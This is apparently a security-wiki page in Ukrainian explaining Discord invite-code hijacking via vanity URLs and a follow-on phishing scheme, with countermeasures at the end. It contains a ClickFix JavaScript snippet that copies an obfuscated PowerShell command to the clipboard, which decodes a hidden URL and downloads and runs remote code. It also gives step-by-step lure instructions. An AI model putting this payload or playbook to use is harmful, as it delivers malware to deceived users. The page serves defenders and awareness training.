# Викрадення Discord-запрошень

{{#include ../../banners/hacktricks-training.md}}

Вразливість системи запрошень Discord дає змогу зловмисникам захоплювати прострочені або видалені коди запрошень (тимчасові, постійні або custom vanity) і реєструвати їх як нові vanity-посилання на будь-якому сервері з Level 3 Boost. Оскільки всі коди нормалізуються до нижнього регістру, зловмисники можуть заздалегідь зареєструвати відомі коди запрошень і непомітно перехопити трафік після завершення терміну дії оригінального посилання або втрати сервером-джерелом свого boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Типи запрошень і ризик hijack

| Тип запрошення           | Можна hijack? | Умова / Коментарі                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Тимчасове посилання-запрошення | ✅          | Після завершення терміну дії код стає доступним, і boosted server може повторно зареєструвати його як vanity URL. |
| Постійне посилання-запрошення | ⚠️          | Якщо код видалено і він складається лише з літер нижнього регістру та цифр, він може знову стати доступним.        |
| Custom Vanity Link    | ✅          | Якщо оригінальний сервер втрачає свій Level 3 Boost, його vanity-запрошення стає доступним для нової реєстрації.    |

## Етапи експлуатації

1. Розвідка
- Відстежуйте публічні джерела (форуми, соціальні мережі, Telegram-канали) на наявність посилань-запрошень, що відповідають шаблону `discord.gg/{code}` або `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Збирайте цікаві коди запрошень (тимчасові або vanity).
2. Попередня реєстрація
- Створіть або використайте наявний Discord-сервер із привілеями Level 3 Boost.
- У **Налаштування сервера → Vanity URL** спробуйте призначити цільовий код запрошення. Якщо код прийнято, його буде зарезервовано за шкідливим сервером.
3. Активація hijack
- Для тимчасових запрошень дочекайтеся завершення терміну дії оригінального запрошення (або видаліть його вручну, якщо контролюєте сервер-джерело).
- Для кодів, що містять великі літери, варіант у нижньому регістрі можна захопити негайно, хоча перенаправлення активується лише після завершення терміну дії.
4. Непомітне перенаправлення
- Користувачі, які переходять за старим посиланням, безперешкодно потрапляють на сервер, контрольований зловмисником, щойно hijack активується.

## Phishing через Discord-сервер

1. Обмежте канали сервера, щоб був видимим лише канал **#verify**.<sup>[[1]](#references)</sup>
2. Розгорніть бота (наприклад, **Safeguard#0786**), щоб він пропонував новим користувачам пройти verify через OAuth2.
3. Бот перенаправляє користувачів на phishing-сайт (наприклад, `captchaguard.me`) під виглядом CAPTCHA або етапу verify.
4. Реалізуйте UX-трюк **ClickFix**:
- Відобразіть повідомлення про несправну CAPTCHA.
- Попросіть користувачів відкрити діалог **Win+R**, вставити попередньо підготовлену команду PowerShell і натиснути Enter.

### Приклад ін'єкції в буфер обміну через ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Цей підхід уникає прямого завантаження файлів і використовує знайомі елементи UI, щоб зменшити підозри користувачів.<sup>[[1]](#references)</sup>

## Заходи протидії

- Використовуйте постійні invite links, що містять щонайменше одну велику літеру або неалфавітно-цифровий символ (не мають терміну дії та не можуть використовуватися повторно).<sup>[[1]](#references)</sup>
- Регулярно змінюйте invite codes і відкликайте старі посилання.
- Відстежуйте статус boost Discord-сервера та заявки на vanity URL.
- Навчайте користувачів перевіряти автентичність сервера й уникати виконання команд, вставлених із буфера обміну.
